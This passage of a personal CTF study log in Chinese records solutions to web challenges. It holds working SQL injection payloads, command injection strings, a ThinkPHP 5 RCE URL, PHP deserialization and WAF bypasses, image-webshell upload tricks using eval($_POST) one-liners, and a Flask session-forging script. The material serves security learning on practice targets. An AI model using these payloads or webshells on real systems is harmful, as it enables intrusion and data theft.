‘geekuser,l0ve1ysq1’</strong></p><pre><code>1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;l0ve1ysq1&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘id,username,password’</strong></p><pre><code>1&#39; union select 1,2,group_concat(password) from l0ve1ysq1#</code></pre><p>flag{7aa6a786-5f9b-4a75-a742-5b380e79dcd2}</p><h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p>其实这个题与lovesql相似</p><p>进行了过滤,输入1’ or 1=1#发现变成了： ‘1=1#’</p><p>可能过滤字符： select or and union from where</p><p>输入：</p><pre><code>1&#39; oorr 1=1#</code></pre><p>得到：<strong>Hello admin！Your password is ‘232dc50f903a404ea874ef30b680a9a4’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,3#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘3’</strong></p><pre><code>1&#39; uniunionon selselectect 1,2,database()#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘geek’</strong>（数据库geek）</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_name=&#39;geek&#39;#</code></pre><p>得到回显：<strong>Table ‘infmation_schema.tables’ doesn’t exist</strong></p><p>注意：是information，故information改为infoorrmation</p><p>但是没有返回值</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#39;geek&#39;#</code></pre><p>得到：<strong>Hello 2！Your password is ‘b4bsql,geekuser’</strong></p><p>得到表：b4bsql,geekuser</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#39;b4bsql&#39;#</code></pre><p>得到回显：<strong>Hello 2！Your password is ‘id,username,password’</strong></p><p>读取列中的字段</p><pre><code>1&#39; uniunionon selselectect 1,2,group_concat(passwoorrd) frfromom b4bsql#</code></pre><p>flag{363a0dd2-accf-4355-878e-84eaf3f6f674}</p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>updatexml()，extractvalue()报错注入解决问题，经过我分析，这两个报错函数语句相同。</p><p>分析语句：</p><p>database()</p><p>select(())</p><p>concat(0x7e,(),0x7e)</p><p>undatexml(1,,1)</p><p>extractvalue(1,,1)</p><p>注入句式：</p><pre><code>admin&#39;or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>geek</del>‘</strong>（数据库）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#39;geek&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>H4rDsq1</del>‘</strong>（表）</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#39;H4rDsq1&#39;)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘<del>id,username,password</del>‘</strong></p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat(passWord))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：<strong>XPATH syntax error: ‘~flag{576fb8c1-905c-4202-8f82-60’</strong></p><p>只是得到了一半flag</p><pre><code>cnm&#39;or(updatexml(1,concat(0x7e,(select(group_concat((right(password,30))))from(H4rDsq1)),0x7e),1))#</code></pre><p>得到回显：XPATH syntax error: ‘<del>1-905c-4202-8f82-605354bf4c57}</del>‘</p><p>flag{576fb8c1-905c-4202-8f82-605354bf4c57}</p><p>嘶~不错</p><h1 id="2021-01-26"><a href="#2021-01-26" class="headerlink" title="2021-01-26"></a>2021-01-26</h1><p>starsnowctf：<a href="http://ctf.starsnowsec.cn/challenges" target="_blank" rel="noopener">http://ctf.starsnowsec.cn/challenges</a></p><h2 id="Rao"><a href="#Rao" class="headerlink" title="Rao"></a>Rao</h2><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))  {    if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)    {      exit(&#39;&lt;script&gt;alert(&quot;give you flag)&quot;)&lt;/script&gt;&#39;);    }    elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)    {      if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)      {        if (!is_array($_POST[&#39;yingzi&#39;])) {        include(&quot;./flag.php&quot;);        echo &quot;Congratulations! FLAG is : &quot;.$flag;        }        else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }      }      else      {        exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);      }    }    else    {      exit(&#39;&lt;script&gt;alert(&quot;wtf&quot;)&lt;/script&gt;&#39;);    }  }}show_source(__FILE__);?&gt;</code></pre><p>逐一分析：</p><p>1.首先</p><pre><code>&lt;?php  if (isset($_POST[&quot;login&quot;]))  {  if (isset($_POST[&#39;yingzi&#39;]))</code></pre><p>判断是否设置了这两个参数</p><p>2.其次</p><pre><code>if (preg_match(&quot;[a-zA-Z0-9]&quot;, $_POST[&#39;yingzi&#39;]) === FALSE)</code></pre><p>将参数yingzi里面的值进行正则匹配，这就意味着必须是26英文字母大小写+数字</p><p>3.然后</p><pre><code> elseif (strlen($_POST[&#39;yingzi&#39;]) &lt; 10 &amp;&amp; $_POST[&#39;yingzi&#39;] &gt; 987654321)</code></pre><p>判断yingzi传的参数长度是否小于10同时满足yingzi传入的参数数值大于987654321</p><p>4.再就是</p><pre><code> if (strpos($_POST[&#39;yingzi&#39;], &#39;#BIG#&#39;) !== FALSE)</code></pre><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p><strong>注释：</strong>strpos() 函数对大小写敏感。</p><pre><code>strpos(string,find,start)string    必需。规定要搜索的字符串。find    必需。规定要查找的字符串。start    可选。规定在何处开始搜索。</code></pre><p>也就是说利用这个来检索yingzi中是否含有#BIG#</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B401%E6%9C%8826%E6%97%A52148_2.png" alt></p><p>Congratulations! FLAG is : flag{rao_rao_rao}</p><p>解释：9e99=9*10^99</p><h2 id="ThinkPHP-5-Rce"><a href="#ThinkPHP-5-Rce" class="headerlink" title="[ThinkPHP]5-Rce"></a>[ThinkPHP]5-Rce</h2><p>Thinkphp5 5.0.22/5.1.29远程代码执行漏洞：</p><pre><code>/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</code></pre><h2 id="Mini-httpd-2018"><a href="#Mini-httpd-2018" class="headerlink" title="Mini_httpd 2018"></a>Mini_httpd 2018</h2><pre><code>GET /flag HTTP/1.1Host: Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close</code></pre><p>l漏洞复现：</p><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/106854028" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/106854028</a></p><h1 id="2021-01-27"><a href="#2021-01-27" class="headerlink" title="2021-01-27"></a>2021-01-27</h1><p>学习php</p><p><a href="https://www.runoob.com/php/php-syntax.html" target="_blank" rel="noopener">PHP 语法</a></p><p><a href="https://www.runoob.com/php/php-variables.html" target="_blank" rel="noopener">PHP 变量</a></p><p><a href="https://www.runoob.com/php/php-echo-print.html" target="_blank" rel="noopener">PHP echo/print</a></p><p><a href="https://www.runoob.com/php/php-datatypes.html" target="_blank" rel="noopener">PHP 数据类型</a></p><p><a href="https://www.runoob.com/php/php-types-comparisons.html" target="_blank" rel="noopener">PHP 类型比较</a></p><p><a href="https://www.runoob.com/php/php-constants.html" target="_blank" rel="noopener">PHP 常量</a></p><p><a href="https://www.runoob.com/php/php-string.html" target="_blank" rel="noopener">PHP 字符串</a></p><p><a href="https://www.runoob.com/php/php-operators.html" target="_blank" rel="noopener">PHP 运算符</a></p><h1 id="2021-01-28"><a href="#2021-01-28" class="headerlink" title="2021-01-28"></a>2021-01-28</h1><p><a href="https://www.runoob.com/php/php-if-else.html" target="_blank" rel="noopener">PHP If…Else</a></p><p><a href="https://www.runoob.com/php/php-switch.html" target="_blank" rel="noopener">PHP Switch</a></p><p><a href="https://www.runoob.com/php/php-arrays.html" target="_blank" rel="noopener">PHP 数组</a></p><p><a href="https://www.runoob.com/php/php-arrays-sort.html" target="_blank" rel="noopener">PHP 数组排序</a></p><p><a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP 超级全局变量</a></p><p><a href="https://www.runoob.com/php/php-looping.html" target="_blank" rel="noopener">PHP While 循环</a></p><p><a href="https://www.runoob.com/php/php-looping-for.html" target="_blank" rel="noopener">PHP For 循环</a></p><p><a href="https://www.runoob.com/php/php-functions.html" target="_blank" rel="noopener">PHP 函数</a></p><h1 id="2021-01-29"><a href="#2021-01-29" class="headerlink" title="2021-01-29"></a>2021-01-29</h1><p>黑马教程-p53</p><h1 id="2021-01-30"><a href="#2021-01-30" class="headerlink" title="2021-01-30"></a>2021-01-30</h1><p>黑马教程p54+16=p70</p><h1 id="2021-01-31"><a href="#2021-01-31" class="headerlink" title="2021-01-31"></a>2021-01-31</h1><p>黑马教程p70+16=p86</p><h2 id="极客大挑战-2019-Secret-File"><a href="#极客大挑战-2019-Secret-File" class="headerlink" title="[极客大挑战 2019]Secret File"></a>[极客大挑战 2019]Secret File</h2><p>怎么说呢~，一切都在源代码里面</p><p>闯关总结：</p><p>1.如果说已经展示完了，但是你什么都不知道，那么只能说明一个问题，就是：你太慢了，需要一帧一帧的抓包来读取2.说flag就在这个页面，那么就是在源代码里面，但是源代码里面没有的话，那么用php://filter来读取</p><p>函数积累：</p><p>stristr() 函数查找字符串在另一个字符串中第一次出现的位置。如果成功，则返回字符串的其余部分（从匹配点）。如果没有找到该字符串，则返回 false。</p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>看了别人的wp，知道这是通过构造来得到命令执行的效果：</p><p>?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</p><p>/?ip=;cat$IFS$9`ls``（直接将当前目录下所有文件全部cat出来，查看源码发现flag）</p><p>关于preg_match() 函数：<a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">https://www.runoob.com/php/php-preg_match.html</a></p><h1 id="2021-02-01"><a href="#2021-02-01" class="headerlink" title="2021-02-01"></a>2021-02-01</h1><p>黑马教程p86-p96</p><h1 id="2021-02-02"><a href="#2021-02-02" class="headerlink" title="2021-02-02"></a>2021-02-02</h1><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>也是一个关于ping的题目</p><p>直接1;cat /flag一把梭</p><h1 id="2021-02-03"><a href="#2021-02-03" class="headerlink" title="2021-02-03"></a>2021-02-03</h1><p>？？？</p><h1 id="2021-02-04"><a href="#2021-02-04" class="headerlink" title="2021-02-04"></a>2021-02-04</h1><p>小年快乐</p><h1 id="2021-02-10"><a href="#2021-02-10" class="headerlink" title="2021-02-10"></a>2021-02-10</h1><h2 id="极客大挑战-2019-Knife"><a href="#极客大挑战-2019-Knife" class="headerlink" title="[极客大挑战 2019]Knife"></a>[极客大挑战 2019]Knife</h2><pre><code>我家菜刀丢了，你能帮我找一下么eval($_POST[&quot;Syc&quot;]);</code></pre><p>这应该直接密码Syc连接就行了吧</p><p>跟录下得到flag：</p><p>flag{26664be8-9ad5-4c5b-ba11-2584c6c5f937}</p><h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>首先会在源代码里面发现在前端呈现页面没有的需要点击的文件，secret.php，打开以后会显示：It doesn’t come from ‘<a href="https://www.Sycsecret.com&#39;关于前一个跳转过来的连接是由referer决定的，就好比很多拉人的活动，应该也是判断referer来计数的，当我改完referer头以后，会显示：Please" target="_blank" rel="noopener">https://www.Sycsecret.com&#39;关于前一个跳转过来的连接是由referer决定的，就好比很多拉人的活动，应该也是判断referer来计数的，当我改完referer头以后，会显示：Please</a> use “Syclover” browser也就是说，让我用syclover浏览器来搞这个，关于反映浏览器的信息好像是user-agent在web二级里面会涉及这一方面的知识，完成修改浏览器信息后，显示：No!!! you can only read this locally!!!这应该是xforwaredfor伪协议添加一个127.0.0.1就ok，得到：flag{692f0abe-00c2-47ec-a5f9-2001d860b4f5}</p><p>考查知识点：http头信息里面每个的理解</p><h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p>右上角点击payflag，源代码里面出现：</p><pre><code>&lt;!--    ~~~post money and password~~~if (isset($_POST[&#39;password&#39;])) {    $password = $_POST[&#39;password&#39;];    if (is_numeric($password)) {        echo &quot;password can&#39;t be number&lt;/br&gt;&quot;;    }elseif ($password == 404) {        echo &quot;Password Right!&lt;/br&gt;&quot;;    }}--&gt;</code></pre><p>post传参并且=404同时满足不能为数字，所以可以用字符串代替404e1，hackbar构造即可，但是还有一句话：Only Cuit’s students can buy the FLAG，抓包将user改为1即可。出现提示字样，让我支付flag，按照提示还需要post传入有money，所以password=404e&amp;money=1e9即可：flag{f7fed39d-bd40-4607-a830-6d8026fc962d}</p><h1 id="2021-03-13"><a href="#2021-03-13" class="headerlink" title="2021-03-13"></a>2021-03-13</h1><h2 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>hints：因为每次猫猫都在我键盘上乱跳，所以我有一个良好的备份网站的习惯</p><p>burp字典：</p><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B403%E6%9C%8813%E6%97%A50901_1.png" alt></p><p>在此处载入字典或者御剑把线程开低点，都可以扫描到<a href="http://www.zip文件，下载即可" target="_blank" rel="noopener">www.zip文件，下载即可</a></p><p>index.php中的重点内容为</p><pre><code>&lt;?php    include &#39;class.php&#39;;    $select = $_GET[&#39;select&#39;];    $res=unserialize(@$select);    ?&gt;</code></pre><p>将get传入的参数select的值反序列化</p><p>class.php内容</p><pre><code>&lt;?phpinclude &#39;flag.php&#39;;error_reporting(0);class Name{    private $username = &#39;nonono&#39;;    private $password = &#39;yesyes&#39;;    public function __construct($username,$password){        $this-&gt;username = $username;        $this-&gt;password = $password;    }    function __wakeup(){        $this-&gt;username = &#39;guest&#39;;    }    function __destruct(){        if ($this-&gt;password != 100) {            echo &quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;;            echo &quot;You name is: &quot;;            echo $this-&gt;username;echo &quot;&lt;/br&gt;&quot;;            echo &quot;You password is: &quot;;            echo $this-&gt;password;echo &quot;&lt;/br&gt;&quot;;            die();        }        if ($this-&gt;username === &#39;admin&#39;) {            global $flag;            echo $flag;        }else{            echo &quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#39;t give you the flag!&quot;;            die();        }    }}?&gt;</code></pre><p>未完待续</p><h1 id="2021-03-16"><a href="#2021-03-16" class="headerlink" title="2021-03-16"></a>2021-03-16</h1><h2 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a><a href="https://blog.csdn.net/qq_42967398/article/details/103512717?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=1328655.9839.16158640888136911&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control" target="_blank" rel="noopener">[RoarCTF 2019]Easy Calc</a></h2><p><strong>考点：PHP的字符串解析特性</strong></p><p><a href="https://blog.csdn.net/weixin_44077544/article/details/102630714" target="_blank" rel="noopener">wp1</a></p><p>右键查看源代码</p><pre><code>&lt;!--I&#39;ve set up WAF to ensure security.--&gt;&lt;script&gt;    $(&#39;#calc&#39;).submit(function(){        $.ajax({            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),            type:&#39;GET&#39;,            success:function(data){                $(&quot;#result&quot;).html(`&lt;div class=&quot;alert alert-success&quot;&gt;            &lt;strong&gt;答案:&lt;/strong&gt;${data}            &lt;/div&gt;`);            },            error:function(){                alert(&quot;这啥?算不来!&quot;);            }        })        return false;    })&lt;/script&gt;</code></pre><p>打开calc.php文件</p><pre><code>&lt;?phperror_reporting(0);//不显示任何报错if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt; </code></pre><p>绕过方式：</p><p>假如waf不允许num变量传递字母：</p><pre><code>http://www.xxx.com/index.php?num=phpinfo()</code></pre><p>那么我们可以在num前加个空格(或者非法字符)：</p><pre><code>http://www.xxx.com/index.php? num = phpinfo()</code></pre><p>这样waf就找不到num这个变量了，因为现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样我们的代码还能正常运行，还上传了非法字符。</p><p>函数利用：</p><p>scandir()函数列出 参数目录 中的文件和目录，要不然我们怎么知道flag在哪。</p><p>chr（）函数，将ascii码进行转码</p><p><a href="https://www.runoob.com/php/func-filesystem-file-get-contents.html" target="_blank" rel="noopener">file_get_contents() 把整个文件读入一个字符串中。</a></p><p><a href="https://baike.baidu.com/item/ASCII/309296?fromtitle=ascii%E7%A0%81&fromid=99077&fr=aladdin" target="_blank" rel="noopener">ascii码</a></p><p>构造参数</p><pre><code>calc.php? num=var_dump(scandir(chr(47)))calc.php? num=var_dump(scandir(/)</code></pre><p>来显示根目录</p><pre><code>calc.php?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))calc.php?%20num=file_get_contents(/flagg)</code></pre><p>方法二：<a href="https://www.jianshu.com/p/357bfe8429ff" target="_blank" rel="noopener">http走私攻击</a></p><h1 id="2021-03-19续2021-03-13"><a href="#2021-03-19续2021-03-13" class="headerlink" title="2021-03-19续2021-03-13"></a>2021-03-19续2021-03-13</h1><h2 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h2><p>根据代码得知username=admin&amp;password=100，所以对其进行序列化，并输出序列化以后的内容</p><pre><code>O:4:&quot;Name&quot;:2:{s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;s:3:&quot;100&quot;;}</code></pre><p>又因为是get传入参数select</p><p>又因为__wakeup函数会将username的值改为guess所以将name后面的属性值改为3，又因为</p><p>private属性序列化:%00类名%00成员名<br>protect属性序列化:%00*%00成员名</p><p>所以：</p><pre><code>/?select=O:4:&quot;Name&quot;:3:{s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;s:3:&quot;100&quot;;}</code></pre><p>得到flag</p><h1 id="2021-03-22"><a href="#2021-03-22" class="headerlink" title="2021-03-22"></a>2021-03-22</h1><h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>用bp抓包针对其后面的文件进行爆破，字典用的的3月13号做php反序列化用到的字典，会得到index.php.bak</p><p>在bp中直接查看响应：</p><pre><code>&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#39;key&#39;])) {    $key = $_GET[&#39;key&#39;];    if(!is_numeric($key)) {        exit(&quot;Just num!&quot;);    }    $key = intval($key);    $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;    if($key == $str) {        echo $flag;    }}else {    echo &quot;Try to find out source file!&quot;;}?&gt;</code></pre><p><a href="https://www.runoob.com/php/php-intval-function.html" target="_blank" rel="noopener">PHP intval() 函数</a></p><h1 id="2021-4-20"><a href="#2021-4-20" class="headerlink" title="2021-4-20"></a>2021-4-20</h1><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><p>这道题后面的两个套娃分别是get和post的md5碰撞</p><p>a[]=1&amp;b[]=2，利用数组来绕过即可</p><p>而此题目的关键在于第一步的：.</p><p>考点sql注入：md5($password,true)</p><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a><strong>语法</strong></h3><p>​         <strong>md5(*string,raw*)</strong></p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>string</td><td>必需。要计算的字符串。</td></tr><tr><td>raw</td><td>可选。1.默认不写为FALSE。32位16进制的字符串TRUE。2.16位原始二进制格式的字符串</td></tr></tbody></table><p>而这里重要的字符转则是ffifdyop，当他在数据库中则会被当做16进制处理而此时是先经过md5加密成32位的16进制后了的所以会被编译成“6xxxxxxx” ，从而实现了万能钥匙</p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>问题点在于前端给定的两张照片的后缀，就是你要在抓包的时候修改.htaccess的content_type：image/png</p><p>同时其内容为</p><pre><code>&lt;FilesMatch &quot;fuck&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;</code></pre><p>意思就是将所有名字中含有fuck字符的文件都以php执行，然后上传fuck.png就可以了</p><p>用菜刀连接，我的蚁剑乱码了</p><h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p>这也是一道文件上传题目，考查的知识点是.user.ini文件的也就是可以用户自定义的php.ini文件，首先这个题目会先使用exif_imagetype函数来判断你所上传的图像的类型，面对这种函数采用图片马绕过当时即可，同时.user.ini文件也需要进行一个图形化的处理：</p><ul><li>JPG ：FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF(相当于文本的GIF89a)：47 49 46 38 39 61</li><li>PNG： 89 50 4E 47</li></ul><p>这里我采用的是GIF89a：</p><pre><code>GIF89aauto_prepend_file=hack.jpg</code></pre><p>图片马制作命令：</p><pre><code>copy 1.jpg/a + 1.php/b hack.jpg</code></pre><p>1.php中需要重新编辑为：</p><pre><code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;666&#39;]);&lt;/script&gt;</code></pre><p>因为后端会对你的&lt;?来进行一个检测</p><p>上传成功后在给出的路径下访问index.php来触发（启动）这个.user.ini，然后post传参就行</p><p>扫描根目录：666=var_dump(scandir(“/“));，我们可以可以看见一个叫flag的文件<br>打印：666=var_dump(file_get_contents(“/flag”));</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>先利用sqlfuzz字典来看看哪些函数被禁用：</p><p>发现or，order,information_schema被过滤，但是order可以通过Order来进行绕过。</p><p>构造payload</p><pre><code>name=1&#39; Order by 4#&amp;pw=1234name=1&#39; Order by 3#&amp;pw=1234</code></pre><p>可以判断有3列，通常为id，username，pw</p><p><strong>本题考点：联合查询所查询的数据不存在时，联合查询会构造一个虚拟的数据</strong></p><p>因为给出了源码地址，所以可以会知道在传入pw后会被$pw=md5（$password）</p><p>所以先构造</p><pre><code>name=admin&#39; union select 0,&#39;admin&#39;,&#39;e10adc3949ba59abbe56e057f20f883e&#39;#&amp;pw=123456</code></pre><p>来临时创建一个数据</p><p>md5=123456，又因为后面#将’注释掉了，而pw为另一个参数并不在同一row，所以不用担心会被注释掉</p><h1 id="2021-4-22"><a href="#2021-4-22" class="headerlink" title="2021-4-22"></a>2021-4-22</h1><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><p>先注册账号，然后登陆，在/change页面下查看源代码，得到：<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">https://github.com/woadsl1234/hctf_flask/</a></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51826_1.png" alt></p><p>也就是python的轻型web开发框架：flask，这里是指明了几个子页面，针对于flask框架的session是保存在客户端的cookie中的，flask仅仅对数据进行了签名。众所周知的是，签名的作用是防篡改，而无法防止被读取。而flask并没有提供加密操作，所以其session的全部内容都是可以在客户端读取的，这就可能造成一些安全问题。</p><p>具体可参考：<br><a href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener">https://xz.aliyun.com/t/3569</a><br><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/client-session-security.html#</a></p><p>步骤：</p><p>1.得到session</p><p>2.解密session：</p><p>脚本（亲测好用）：</p><pre><code># flask框架，针对session的解密脚本# 用法python hctf_admin.py [session值]import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p>得到：<img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//%E6%90%9C%E7%8B%97%E6%88%AA%E5%9B%BE21%E5%B9%B404%E6%9C%8822%E6%97%A51831_2.png" alt></p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;test&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>但是如果我们想要加密伪造生成自己想要的session还需要知道SECRET_KEY</p><p>3.根据得到的网站源代码继续查找：</p><p>其中在config.py中找到了SECRET_KEY：ckj123</p><p>通过index.html中得知session[‘name’] == ‘admin’即可得到flag</p><p>4.修改序列化中的内容：</p><pre><code>{&#39;_fresh&#39;: True, &#39;_id&#39;: b&#39;1b917c9c3d1e4ed8bd25e61e7244e9768b2748b5e473d8da4543a3af3ab19736dcc10cb00cce46dbb944f3120f7faf739997fbd7e1a9168cd0aba8ff4a1083a5&#39;, &#39;csrf_token&#39;: b&#39;c8230e23f995910f94fca46c22c2b6af10562efc&#39;, &#39;image&#39;: b&#39;6Yku&#39;, &#39;name&#39;: &#39;admin&#39;, &#39;user_id&#39;: &#39;10&#39;}</code></pre><p>5.利用SECRET_KEY：ckj123生成session，并传入到客户端去访问：</p><p><img 